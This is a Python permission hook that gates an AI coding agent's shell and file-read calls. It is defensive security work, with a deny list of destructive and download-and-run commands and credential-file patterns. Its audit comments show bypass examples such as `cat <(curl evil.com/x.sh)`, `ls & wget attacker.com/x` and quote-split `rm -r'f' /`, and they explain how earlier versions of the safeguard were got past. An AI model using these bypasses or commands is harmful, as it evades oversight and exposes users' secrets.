#!/usr/bin/env python3
"""PreToolUse hook: programmatic permission decisions for Bash commands.

WHY PreToolUse, not PermissionRequest (SEC-03, 2026-07-18): this hook was
originally registered under the PermissionRequest event. Per the official
docs (code.claude.com/docs/en/hooks, verified via WebFetch, not assumed),
PermissionRequest fires "When a permission dialog appears". hooks/
settings.json has "Bash(*)" unconditionally in permissions.allow -- a
static rule that auto-approves every Bash command with NO dialog ever
shown. Since PermissionRequest only fires when a dialog is about to
appear, it NEVER fired for any Bash command under this repo's own config
-- every rule below, including the SEC-01 pytest/npm-test "ask" fix and
the entire DANGEROUS_PATTERNS deny list, was dead code the whole time
Bash(*) has been in the allow list.

PreToolUse hooks fire on every tool call unconditionally, before
permission rules are evaluated, and CAN override a matching allow rule --
the permissions doc gives this exact scenario as the recommended pattern:
"add `Bash` to your allow list and register a PreToolUse hook that
rejects those specific commands" (code.claude.com/docs/en/permissions).
emit_permission_decision(deny) blocks the call outright even under
Bash(*); "ask" forces the confirmation prompt the same way. Read-only
tools are always safe, explicitly dangerous Bash commands are denied,
everything else that isn't an established safe prefix asks the user.
"""

import re

from lib.runtime import emit_permission_decision, get_tool_input, hook_main, parse_stdin
from lib.security import shell_statement_tokens

ALWAYS_SAFE_TOOLS: tuple[str, ...] = (
    "Read",
    "Glob",
    "Grep",
    "Task",
    "TaskCreate",
    "TaskUpdate",
    "TaskList",
    "TaskGet",
    "WebSearch",
    "WebFetch",
)

# WHY pytest/python -m pytest/npm test/npm run test/npm run lint are NOT
# here (SEC-01, external security audit 2026-07-17): these commands EXECUTE
# repository-defined code, not just read it. pytest imports conftest.py,
# fixtures, and plugins from the working tree before running a single test;
# `npm test`/`npm run <script>` runs whatever arbitrary shell command
# package.json's "scripts" section defines -- there is no way to know in
# advance that it is actually a test runner and not `"test": "curl evil |
# bash"`. Auto-allowing these by prefix match let a malicious conftest.py or
# package.json test/lint script execute with the user's privileges with zero
# confirmation the moment an agent ran "the tests" in an untrusted repo --
# the prefix match also collided on any command merely STARTING WITH these
# names (e.g. a `pytest-malicious` executable on PATH). ruff/mypy stay below:
# both are pure static analyzers that parse source without executing it.
SAFE_BASH_PREFIXES: tuple[str, ...] = (
    "git status",
    "git log",
    "git diff",
    "git branch",
    "git show",
    "ruff",
    "mypy",
    "ls",
    "pwd",
    "cat ",
    "head ",
    "tail ",
    "wc ",
    "echo ",
    "which ",
    "python --version",
    "node --version",
)

# WHY (HIGH, external security audit 2026-07-07, independently confirmed): a
# read-only shell command is not automatically a SAFE one to auto-allow --
# `cat ~/.ssh/id_rsa` or `cat .env` starts with the auto-allowed "cat "
# prefix, has no chain operator, and would disclose real secrets straight
# into Claude's context with zero user confirmation. Same denylist shape
# already used by pre_commit_guard.py's staged-secrets check, extended with
# a few more common credential-file names relevant to a READ (not commit)
# context.
SENSITIVE_PATH_PATTERNS: tuple[str, ...] = (
    ".env",
    ".ssh",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    "credentials",
    ".pem",
    ".key",
    ".npmrc",
    ".netrc",
    ".aws",
    ".git-credentials",
    "known_hosts",
    "secret",
    "token",
    "password",
    "gh/hosts",  # GitHub CLI's OAuth token file (~/.config/gh/hosts.yml)
    ".docker/config",  # Docker registry auth
    ".kube/config",  # Kubernetes cluster credentials
    ".pgpass",
    "shadow",
    # WHY these four (Credential Non-Possession P1.1, 2026-09-12): closes the
    # Bash-side half of the same gap _targets_sensitive_config_read() closes
    # for Read/Grep/Glob below. Without these, `cat ~/.claude.json` returned
    # ("allow", "") -- verified by direct decide() call before this fix --
    # because none of the patterns above match this filename, so
    # _names_a_sensitive_path() never fired and the "cat " safe-prefix
    # allowed it outright.
    ".claude.json",
    "claude_desktop_config.json",
    ".mcp.json",
    "mcp.json",
)


# WHY this exists at all (Credential Non-Possession P1.1, 2026-09-12, found
# live during design review of a since-abandoned isolation test pack --
# docs/credential-broker-pilot-threat-model.md's "VERDICT: REJECTED before
# execution" section has the full incident): a single Grep call against
# ~/.claude.json -- an ALWAYS_SAFE_TOOLS-class, zero-gate, always-approved
# tool call, not even Bash -- recovered a real MCP server's plaintext
# credential (mcpServers.<name>.env.<VAR>). SENSITIVE_PATH_PATTERNS above
# never applied here for two independent reasons: (1) it originally didn't
# list this filename at all, and (2) even after adding it, that check only
# ran inside the `tool_name == "Bash"` branch below -- Read/Grep/Glob
# returned ("allow", "") from the ALWAYS_SAFE_TOOLS check BEFORE any of
# this file's other logic ever executed. This is the first check in this
# file that applies to a non-Bash tool.
#
# WHY reuse SENSITIVE_PATH_PATTERNS's substring semantics, NOT a separate
# exact-basename list (revised, sec-auditor-found, 2026-09-12 -- the first
# cut of this function used exact basename equality against a narrower
# list; sec-auditor demonstrated two live bypasses against files that
# exist on this exact machine RIGHT NOW: `.claude.json.backup` and
# `.claude.json.tmp.<pid>.<hash>` -- both real, both Claude-Code-created,
# both containing the same mcpServers.*.env content, neither an exact
# basename match. A substring check catches both for free, and is the
# SAME semantics Bash's own `_names_a_sensitive_path()` already uses for
# `.env`/`.ssh`/`credentials`/etc -- unifying onto one list and one
# matching style, instead of two different ones with different false-
# negative profiles, is itself part of the fix, not just a simplification):
# the accepted false-positive tradeoff this creates (e.g. `my_mcp.json.bak`
# now also denied) is the SAME tradeoff already accepted for `.env.example`
# under the Bash-side list -- consistent, not a new risk class.
def _targets_sensitive_config_read(tool_name: str, tool_input: dict) -> bool:
    """True iff a Read/Grep/Glob call's target string(s) contain a
    SENSITIVE_PATH_PATTERNS substring.

    Per-tool candidate fields (sec-auditor-found gap, 2026-09-12): a Grep
    call's `glob` parameter, and a Glob call's `pattern` parameter, can
    each name the exact target file just as precisely as `path` can --
    checking only `path` for both tools (the first cut of this function)
    let `Grep(pattern="X", path=".", glob=".claude.json")` and
    `Glob(pattern="**/.claude.json")` both return the file's content/path
    with zero gate. Grep's own `pattern` argument (the search regex) is
    deliberately NOT checked here -- unlike `glob`, it's ordinary search
    CONTENT, not a path, and treating it as one would make searching
    source code for the word "credentials" itself trigger a false deny.

    Deliberately narrow, one specific gap named as NOT closed by this
    function (see docs/credential-broker-pilot-threat-model.md's own
    "Known, accepted, NOT closed" convention): a Grep/Glob call whose
    `path` is a DIRECTORY that merely CONTAINS one of these files
    somewhere in its tree, with no `glob` argument narrowing it to that
    file, is not caught here -- only a call whose own path/glob/pattern
    argument itself contains a sensitive substring. Closing the directory-
    recursion case fully would require scanning matched file paths in the
    tool's OWN response (a PostToolUse concern, and PostToolUse cannot
    deny -- see this repo's own F-03/F-12 finding) or denying broad,
    undirected Grep/Glob calls outright, which would reintroduce exactly
    the kind of routine-command friction the 2026-09-02 solo-autonomy fix
    was built to remove.
    """
    if tool_name == "Read":
        candidates = [str(tool_input.get("file_path", ""))]
    elif tool_name == "Grep":
        candidates = [str(tool_input.get("path", "")), str(tool_input.get("glob", ""))]
    elif tool_name == "Glob":
        candidates = [str(tool_input.get("path", "")), str(tool_input.get("pattern", ""))]
    else:
        return False
    for raw in candidates:
        # WHY no explicit .strip() here (sec-auditor raised, 2026-09-12,
        # under the FIRST cut's exact-basename design -- a trailing space or
        # dot that Windows silently drops when actually opening the file,
        # e.g. `.claude.json ` / `.claude.json.`, would have desynced an
        # exact-equality comparison). Verified by mutation testing AFTER
        # switching to substring containment (see this function's own WHY
        # comment above) that an explicit strip is no longer load-bearing:
        # removing trailing characters can never eliminate a substring match
        # that was already present in the longer string, so `in` already
        # tolerates this case for free. Confirmed empirically: reverting an
        # earlier strip() call here changed zero test outcomes. Kept simple
        # rather than carrying dead code that implies a protection this
        # design no longer needs a dedicated line for.
        candidate_scan = raw.replace("\\", "/").lower()
        if not candidate_scan:
            continue
        if any(pattern in candidate_scan for pattern in SENSITIVE_PATH_PATTERNS):
            return True
    return False


# WHY these four: they are the read-only prefixes in SAFE_BASH_PREFIXES
# that take an arbitrary file path argument. "echo "/"ls"/"pwd"/etc. don't
# read file CONTENT the way cat/head/tail/wc do. `wc -l .env` or
# `wc -c ~/.ssh/id_rsa` leaks byte/line/word counts of a sensitive file's
# content without needing the "cat "/"head "/"tail " gate at all (security
# audit 2026-07-12, F-16).
_PATH_SENSITIVE_READ_PREFIXES: tuple[str, ...] = ("cat ", "head ", "tail ", "wc ")


# WHY (MEDIUM, self-audit 2026-08-22 during a hook-control-matrix build):
# `cmd_lower.startswith(prefix)` has no word-boundary check. Prefixes that
# already end in a space ("cat ", "echo ") are safe by construction -- a
# collision would need a literal space in the colliding name. But "ruff",
# "mypy", "ls", "pwd", "git status", "git log", "git diff", "git branch",
# "git show", "python --version", "node --version" do NOT end in a space,
# so a same-prefix different-command match (a `ruffian` wrapper script, a
# `lsof` invocation, a `pwd123` executable planted on PATH) auto-allows on
# nothing more than sharing a prefix -- the exact bypass class SEC-01
# (2026-07-17) already removed pytest/npm-test for, just not extended to
# these. Fixed generally: require the match end at a word boundary (end of
# string or a following space), not merely be a leading substring.
def _matches_safe_prefix(cmd_lower: str, prefix_lower: str) -> bool:
    """True if cmd_lower starts with prefix_lower AND the prefix match ends
    at a word boundary. `lsof ...` must NOT match "ls"; `ruffian` must NOT
    match "ruff"; `ls -la` and `ruff check .` (space right after) still do."""
    if not cmd_lower.startswith(prefix_lower):
        return False
    if prefix_lower.endswith(" "):
        return True
    tail = cmd_lower[len(prefix_lower) :]
    return tail == "" or tail[0] == " "


def _dequote(cmd_lower: str) -> str:
    """Quote-splitting-proof scan text for pattern-substring checks only.

    WHY (closes the last documented residual gap, falsification-pilot
    20260824; refactored the same day onto the shared `shell_command_tokens`
    utility in `hooks/lib/security.py` instead of this function's original
    ad-hoc `.replace("'", "").replace('"', "")` patch, once a repo-wide sweep
    found two OTHER hooks had independently needed the identical fix): a
    literal `pattern in cmd_lower` scan is not real shell tokenization. Bash
    concatenates adjacent quoted/unquoted fragments into one word, so
    `git show HEAD:'.e'nv` and `git show HEAD:.env` execute identically --
    confirmed byte-for-byte in a throwaway repo -- but only the second
    contains ".env" as a literal substring, so the sensitive-path scan
    missed the first entirely (auto-ALLOW). The same technique degrades
    DANGEROUS_PATTERNS from "deny" to a bare "ask": `rm -r'f' /` no longer
    contains "rm -rf" as a substring (independently reproduced before this
    fix). Real tokenization (`shlex.split(posix=True)`, already proven
    correct in `pre_commit_guard.py`) reconstructs quote-split words exactly
    as bash would, which a blind character-strip only approximated. Joining
    tokens with a single space is still a safe superset scan relative to the
    raw command for substring membership -- it cannot hide a pattern that
    was there unquoted, only reveal one that quote-splitting had hidden.

    WHY `shell_statement_tokens` (plain shlex on the whole string), NOT
    `shell_command_tokens` (which also chain-splits on `&&`/`||`/`;`/`|`/`&`
    first): several DANGEROUS_PATTERNS entries are themselves defined around
    a chain operator (`"curl | bash"`, `"wget | bash"`) -- chain-splitting
    before the scan would separate exactly the substring those patterns
    need to match, turning a `deny` into an `ask` (caught by this file's own
    test suite, `test_curl_pipe_bash_blocked`, on first attempt with the
    chain-splitting variant). Quote-splitting protection alone doesn't need
    statement-splitting; `shlex.split` already reconstructs quote-split
    words while leaving `|`/`&`/`;` as their own literal tokens.

    Deliberately NOT applied to prefix-matching
    (_matches_safe_prefix/SAFE_BASH_PREFIXES) or CHAIN_OPERATORS: obfuscating
    a SAFE prefix this way only prevents it from matching, which pushes the
    command toward the safe "ask" default, not toward "allow" -- no
    vulnerability in that direction, no reason to touch that logic.
    """
    return " ".join(shell_statement_tokens(cmd_lower))


def _reads_sensitive_path(cmd_lower: str) -> bool:
    """True if a cat/head/tail/wc — or a git-history read — command's target
    path looks like a secret.

    WHY the git branch (falsification-pilot 20260824, paraphrase-sensitivity
    probe): `git show HEAD:.env`, `git log -p .env`, `git diff HEAD~1 -- .env`
    all dump full file content -- including from commits no longer in the
    working tree -- but were routed through the "git show"/"git log"/"git
    diff" SAFE_BASH_PREFIXES entries, never reaching this function at all.
    Same failure shape as F-16 (wc missing the cat/head/tail gate): a
    content-reading safe-prefix the sensitive-path check didn't know about.
    """
    cmd_scan = _dequote(cmd_lower)
    for prefix in _PATH_SENSITIVE_READ_PREFIXES:
        if cmd_lower.startswith(prefix):
            return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)

    # WHY (security-audit follow-up, same pilot): a filename-substring scan
    # only catches `git show <ref>:<path>` -- it says nothing about `git show
    # <ref>` with NO ":<path>", which defaults to dumping the FULL commit
    # patch (every changed file, including ones never named in the command
    # text). Reproduced live: `git show HEAD~1` alone printed a secret from a
    # since-removed .env with zero filename anywhere in the command. Route
    # any unrestricted "git show <ref>" to "ask" -- there is no way to bound
    # what such a command touches from the command string alone.
    if cmd_lower.startswith("git show ") and ":" not in cmd_lower:
        return True

    # `git log` defaults to metadata-only (safe); `-p`/`--patch`/`-u` switch
    # it to full per-commit patches, the same unrestricted-content-dump risk
    # as bare `git show` above. Word-boundary check so "-parent"-style flags
    # (if any existed) wouldn't false-positive; none currently do, kept for
    # robustness against future flag additions.
    if cmd_lower.startswith("git log ") and re.search(r"(^|\s)(-p|--patch|-u)(\s|$)", cmd_lower):
        return True

    # WHY (human decision, 20260824, closing the last gap in this class):
    # `git diff <ref(s)>` with no `-- <path>` restriction defaults to a full
    # multi-file patch, identical risk to bare `git show`/`git log -p` above
    # -- reproduced live leaking a historical secret via `git diff HEAD~1
    # HEAD` with no filename anywhere in the command. This deliberately
    # changes a previously-tested contract (`git diff HEAD` used to auto-
    # allow); accepted confirmation friction on a common command in
    # exchange for closing a demonstrated secret-leak path. `-- <path>`
    # restricts scope, so it's still scanned for sensitivity rather than
    # blanket-asked.
    if cmd_lower.startswith("git diff "):
        if " -- " in cmd_lower:
            return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)
        return True

    for prefix in ("git show ", "git log "):
        if cmd_lower.startswith(prefix):
            return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)
    return False


def _names_a_sensitive_path(cmd_lower: str) -> bool:
    """Narrower than `_reads_sensitive_path()` above (skeptic-found,
    2026-09-12, see docs/credential-broker-pilot-threat-model.md): True ONLY
    when the command explicitly names a path matching SENSITIVE_PATH_PATTERNS
    -- never for `_reads_sensitive_path()`'s "unbounded scope, no specific
    path named" branches (bare `git show <ref>`, `git log -p`, bare `git diff
    <refs>`). Those branches return True for a DIFFERENT reason -- "this
    command's blast radius can't be verified from the text at all" -- not
    "this command names something that looks like a secret". Escalating that
    broader, differently-justified category to a hard no-recourse deny would
    silently turn `git show HEAD`/`git diff HEAD`/`git log -p` (extremely
    common, ordinary commands with no relation to credentials) into a hard
    block -- reproduced by direct trace before this narrower helper existed.
    `decide()` itself still routes ALL of `_reads_sensitive_path()`'s True
    cases to "ask" (unchanged, its own 13 tests untouched) -- ONLY the
    escalation in main() (see below) uses this narrower predicate instead."""
    cmd_scan = _dequote(cmd_lower)
    for prefix in _PATH_SENSITIVE_READ_PREFIXES:
        if cmd_lower.startswith(prefix):
            return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)
    if cmd_lower.startswith("git diff ") and " -- " in cmd_lower:
        return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)
    if cmd_lower.startswith("git show ") and ":" in cmd_lower:
        return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)
    if cmd_lower.startswith("git log ") and ":" in cmd_lower:
        return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)
    return False


DANGEROUS_PATTERNS: tuple[str, ...] = (
    "rm -rf",
    "rm -r -f",
    "DROP TABLE",
    "DROP DATABASE",
    "TRUNCATE TABLE",
    "DELETE FROM",
    "git push --force",
    "git push -f",
    "git reset --hard",
    "git clean -fd",
    "chmod 777",
    "chmod a+rwx",
    "format C:",
    "format D:",
    "del /s /q",
    "rmdir /s /q",
    "npm publish",
    "pip install --break-system-packages",
    "curl | bash",
    "curl | sh",
    "wget | bash",
    "wget | sh",
    "sudo ",
    "mkfs",
    "dd if=",
    "> /dev/sd",
    "python -c",
    "python3 -c",
    "base64 -d",
    "base64 --decode",
    "powershell -enc",
    "powershell -e ",
    "certutil -urlcache",
    "reg delete",
    "shutdown",
    "reboot",
    "kill -9",
    "killall",
    "nohup",
)

# WHY a dedicated regex instead of a bare "eval " entry in DANGEROUS_PATTERNS
# (2026-07-23, real, reproduced false positives -- not hypothetical): a plain
# substring check for "eval " (with trailing space) blocked any Bash command
# whose TEXT happened to contain an unrelated word followed by a space, e.g.
# "--ignore=tests/boyko_eval 2>&1" (a directory name) or a commit message
# containing the English phrase "Boyko Agent eval suite" -- both hit in one
# real session. A bare `\beval\b` word-boundary fix is NOT sufficient on its
# own: "eval suite" still has genuine word boundaries on both sides of
# "eval", so `\beval\b` would still incorrectly flag it. The actual signal
# that distinguishes a genuine dangerous invocation from English prose is
# POSITION: a real `eval` command must be at the start of the command string
# or immediately after a shell command-separator (;, &, |, backtick, newline)
# or a `$(` subshell open -- "eval" appearing in the middle of a sentence,
# preceded by an ordinary word and space, is never a command invocation.
# Verified this still catches the dangerous shapes ("eval $(curl ...)",
# "echo x; eval $(...)", "curl ... | eval") while no longer matching either
# reproduced false positive.
_EVAL_COMMAND_RE = re.compile(r"(?:^|[;&|`\n]|\$\()\s*eval\b", re.IGNORECASE)

# WHY a dedicated position-anchored regex, NOT bare strings in
# DANGEROUS_PATTERNS (Credential Non-Possession Phase 1, 2026-09-12 --
# skeptic-found, confirmed by direct execution before fixing, same failure
# shape as the "eval" case immediately above): a first cut added "gh auth
# token" and "gh auth status --show-token" as bare DANGEROUS_PATTERNS
# entries. Reproduced: `git commit -m "fix: block gh auth token disclosure"`,
# `grep -r "gh auth token" hooks/`, and `echo "documenting gh auth token
# behavior"` all hit DENY -- exactly the commit message this very fix needed
# to use. DANGEROUS_PATTERNS is a bare substring scan with no notion of
# "inside a quoted argument to an unrelated command" vs "an actual command
# invocation" -- the identical class of false positive `_EVAL_COMMAND_RE`
# was built to fix for "eval". Anchoring on position (start of command, or
# immediately after a command-separator/subshell-open) instead of a bare
# substring closes the same gap here: `gh auth token` (bare, at start),
# `x && gh auth token`, `x; gh auth token`, `$(gh auth token)` are real
# invocations and still match; `git commit -m "... gh auth token ..."` does
# not, because "gh" there is preceded by ordinary prose text, not an anchor.
_GH_AUTH_TOKEN_RE = re.compile(
    r"(?:^|[;&|`\n]|\$\()\s*gh\s+auth\s+(?:token\b|status\s+--show-token\b)",
    re.IGNORECASE,
)

# WHY: shell metacharacters indicate command chaining — a "safe" prefix
# followed by && or | can execute arbitrary commands after the safe one.
# WHY ">" is here too: redirection is a write operation, not just chaining,
# but the same "any of these chars disqualifies auto-allow" gate covers it
# correctly. Without it, "echo payload > .env" auto-approved via the "echo "
# safe prefix, since redirection was never treated as unsafe — a single ">"
# substring check also catches "1>", "2>", and ">>" variants for free.
# WHY "<" (SEC-04, external review 2026-07-22, verified by direct decide()
# calls before this fix): process substitution "<(...)" runs an ARBITRARY
# command and feeds its stdout to the outer command — "cat <(curl evil.com/x
# .sh)" starts with the auto-allowed "cat " prefix, contains no operator that
# was in this tuple, and matched no SENSITIVE_PATH_PATTERNS substring, so it
# returned "allow" with zero confirmation despite running curl. Verified
# empirically: with "<" absent, decide("Bash", {"command": "cat <(curl
# evil.com/x.sh)"}) == ("allow", ...); after adding "<", the same call falls
# through to the chain-operator "ask" branch like ">" already does. A bare
# "<" substring also catches heredocs ("<<", "<<<") and simple input
# redirection ("cat < file") for free, same as ">" already covers ">>"/"1>"/
# "2>". NOTE: this does NOT fix the separate, pre-existing gap where "cat
# some-generic-filename" (no "<" at all) already auto-allows because
# SENSITIVE_PATH_PATTERNS only matches known secret-ish substrings, not
# arbitrary filenames — verified that gap exists identically with or without
# "<", so it is a SAFE_BASH_PREFIXES/SENSITIVE_PATH_PATTERNS design
# limitation, not something this specific fix claims to close.
# WHY "&" (SEC-05, adversarial review 2026-08-22 of the word-boundary fix
# above): a bare background operator was missing. `ls & wget attacker.com/x`
# passes every earlier check -- no "&&", no pipe, no dangerous substring --
# then matches the "ls" safe prefix (boundary check admits the following
# space) and auto-ALLOWS, while Bash still runs `wget` in the foreground.
# A substring check on "&" catches both bare "&" and "&&" for free, the same
# trick ">" already uses for ">>"/"1>"/"2>" and "<" for "<<"/"<<<".
CHAIN_OPERATORS: tuple[str, ...] = ("&&", "||", ";", "|", "`", "$(", "\n", ">", "<", "&")


def decide(tool_name: str, tool_input: dict) -> tuple[str, str]:
    """Return (behavior, message) tuple."""
    # WHY this check runs BEFORE the ALWAYS_SAFE_TOOLS early-return, the only
    # place in this file that does (Credential Non-Possession P1.1, found
    # live 2026-09-12 -- see _targets_sensitive_config_read()'s own WHY
    # comment above for the incident): "read-only tools never modify state"
    # is true but incomplete -- a read-only tool can still DISCLOSE state it
    # should not, and Read/Grep/Glob on a sensitive-path-shaped target
    # (Claude Code's own MCP config files among them) disclose plaintext
    # secrets in one call. This is a hard deny, not routed through the
    # "ask" tier at all, because there is no legitimate reason for Claude to
    # read these files directly.
    if _targets_sensitive_config_read(tool_name, tool_input):
        return (
            "deny",
            "Blocked: this path matches a sensitive-path pattern (see "
            "hooks/permission_policy.py's SENSITIVE_PATH_PATTERNS) -- "
            "commonly because it is (or is named like) an MCP server config "
            "storing credentials in plaintext under mcpServers.*.env. Note: "
            "a project-committed .mcp.json manifest using ${VAR} "
            "substitution rather than literal secrets is also denied here "
            "-- this gate cannot distinguish the two at decision time and "
            "errs toward blocking.",
        )

    # WHY: read-only tools never modify state — safe to auto-approve
    if tool_name in ALWAYS_SAFE_TOOLS:
        return ("allow", "")

    if tool_name == "Bash":
        command = tool_input.get("command", "")
        cmd_lower = command.lower().strip()
        cmd_scan = _dequote(cmd_lower)

        # WHY: check dangerous first — deny takes priority over allow
        # WHY cmd_scan (dequoted), not cmd_lower: `rm -r'f' /` degrades this
        # deny to a bare "ask" under a raw substring scan -- independently
        # reproduced before this fix. See _dequote's docstring.
        for pattern in DANGEROUS_PATTERNS:
            if pattern.lower() in cmd_scan:
                return ("deny", f"Blocked dangerous command: {pattern}")

        if _EVAL_COMMAND_RE.search(command):
            return ("deny", "Blocked dangerous command: eval")

        if _GH_AUTH_TOKEN_RE.search(command):
            return ("deny", "Blocked dangerous command: gh auth token")

        # WHY: any command with chaining operators is not safe to auto-approve,
        # even if it starts with a safe prefix like "git status && rm -rf /"
        for op in CHAIN_OPERATORS:
            if op in command:
                return ("ask", "")

        # WHY checked before the safe-prefix loop below: cat/head/tail are
        # "safe" prefixes for ordinary files, but reading a secret is not
        # made safe just because the read itself has no side effects.
        if _reads_sensitive_path(cmd_lower):
            return ("ask", "")

        # WHY: safe bash prefixes are read-only or standard dev tools
        # Only checked AFTER chain operators are excluded
        for prefix in SAFE_BASH_PREFIXES:
            if _matches_safe_prefix(cmd_lower, prefix.lower()):
                return ("allow", "")

    # WHY: default to asking — explicit user consent for unknown operations
    return ("ask", "")


def main() -> None:
    data = parse_stdin()
    if not data:
        return

    tool_name = data.get("tool_name", data.get("tool", ""))
    tool_input = get_tool_input(data)

    behavior, message = decide(tool_name, tool_input)

    # WHY emit ONLY on "deny" and stay silent on "ask"/"allow" (owner decision,
    # 2026-09-02): this hook sat on the dead PermissionRequest event for six
    # weeks; the day it was re-wired to PreToolUse/Bash, every routine command
    # with `&&`/`;`/`|` -- i.e. most real commands -- started raising a
    # confirmation dialog in every open session, because decide() returns
    # "ask" for any chain operator and for anything outside SAFE_BASH_PREFIXES.
    # The owner works solo on his own machine and runs tasks unattended
    # overnight; a per-tool-call prompt is a blocker, not a safeguard, for that
    # threat model (see the project's solo-autonomy feedback memory). Emitting
    # nothing lets the static `Bash(*)` allow rule apply, so the only thing
    # this hook does on his machine is what he actually wants from it: hard
    # DENY on DANGEROUS_PATTERNS. decide() itself is unchanged -- its
    # three-way verdict is still tested and still available to any consumer
    # that wants the "ask" tier (a team install, a stricter profile).
    #
    # WHY emit_permission_decision, not a hand-built PermissionRequest JSON:
    # this is a PreToolUse hook, whose SDK-documented output field is
    # hookSpecificOutput.permissionDecision (see lib/runtime.py's
    # emit_permission_decision docstring), not PermissionRequest's
    # decision.behavior shape.
    #
    # WHY escalate ONE specific "ask" case to "deny" here in main(), rather
    # than changing decide()'s own return value (Credential Non-Possession
    # Phase 1 kill analysis, 2026-09-12, see
    # docs/credential-broker-pilot-threat-model.md): decide()'s three-way
    # verdict for a sensitive-path read (`cat .env`, `cat ~/.ssh/id_rsa`, ...)
    # is "ask" -- correct and still tested as "ask" for a profile where "ask"
    # actually prompts the user (a team install, a stricter profile). On
    # THIS solo-autonomy machine specifically, "ask" is silently dropped by
    # the paragraph above, which makes a sensitive-path read behave exactly
    # like "allow" -- verified live: `hooks/settings.json` has zero deny
    # rules for `.env`/`.ssh`/credential-file reads, and a proposed
    # credential-broker pilot was rejected specifically because of this gap.
    # A sensitive-path read is not the same class of interruption as the
    # routine chain-operator "ask" the 2026-09-02 fix was built to silence --
    # blocking `cat .env` outright does not stop ordinary unattended work the
    # way per-command confirmation dialogs did. So: on THIS profile only,
    # re-derive whether this specific "ask" NAMES a sensitive path and
    # escalate just that narrower case to a hard, always-emitted "deny" --
    # decide()'s own contract, and its 13 existing "ask" tests, are
    # untouched.
    #
    # WHY `_names_a_sensitive_path()`, NOT `_reads_sensitive_path()` (skeptic-
    # found, 2026-09-12, confirmed by direct trace before fixing): the first
    # cut called `_reads_sensitive_path()` directly, which ALSO returns True
    # for bare `git show <ref>` / `git log -p` / bare `git diff <refs>` --
    # commands whose blast radius can't be verified from the text at all, a
    # different risk reason than "this names something secret-looking".
    # Escalating THOSE to hard-deny would have silently turned ordinary,
    # extremely common commands like `git show HEAD` into a hard block with
    # zero relation to credentials. `_names_a_sensitive_path()` only fires
    # for the actual SENSITIVE_PATH_PATTERNS substring match branches.
    #
    # KNOWN, ACCEPTED LIMITS of this narrow fix (skeptic-found, not closed
    # here -- see docs/credential-broker-pilot-threat-model.md for the full
    # kill-analysis discipline this follows): (1) an alternate reader not in
    # `_PATH_SENSITIVE_READ_PREFIXES` (`less .env`, `bash -c "cat .env"`,
    # `sed '' .env`) or a sensitive read placed AFTER a chain operator
    # (`echo x && cat .env`) is not caught -- these were ALREADY effectively
    # allowed before this fix (silently-dropped "ask"), so this is not a
    # regression, only an incomplete improvement; (2) SENSITIVE_PATH_PATTERNS
    # is a substring scan and can false-positive on legitimate names
    # (`.env.example`, `secretsanta.txt`) -- previously harmless at the
    # silently-dropped "ask" tier, now a real (safe-direction) block with no
    # in-session recourse. Both are real, named limits, not silently ignored
    # -- revisit only if actually observed to cause real friction, per this
    # session's own established "wait for real signal, don't polish
    # speculatively" discipline (see the routing-floor freeze-gate decision
    # the same night).
    if behavior == "deny":
        emit_permission_decision(decision=behavior, reason=message)
    elif (
        behavior == "ask"
        and tool_name == "Bash"
        and _names_a_sensitive_path(str(tool_input.get("command", "")).lower().strip())
    ):
        emit_permission_decision(
            decision="deny",
            reason="Blocked: command names a sensitive-path file (.env/.ssh/credentials/"
            "token/etc.) — see hooks/permission_policy.py's SENSITIVE_PATH_PATTERNS. "
            "Escalated from the generic 'ask' tier because this solo-autonomy profile "
            "does not surface 'ask' prompts (see this file's own WHY comment).",
        )


if __name__ == "__main__":
    # WHY fail_closed=True: this hook's job is to deny dangerous Bash
    # commands (rm -rf, curl|bash, DROP TABLE, ...) -- same category as
    # input_guard.py/mcp_response_guard.py/pre_commit_guard.py, which all
    # fail closed on crash/timeout per utils.hook_main's own rationale.
    # Failing open here would silently let exactly the commands this hook
    # exists to block through if the hook itself crashed or hung.
    hook_main(main, fail_closed=True)
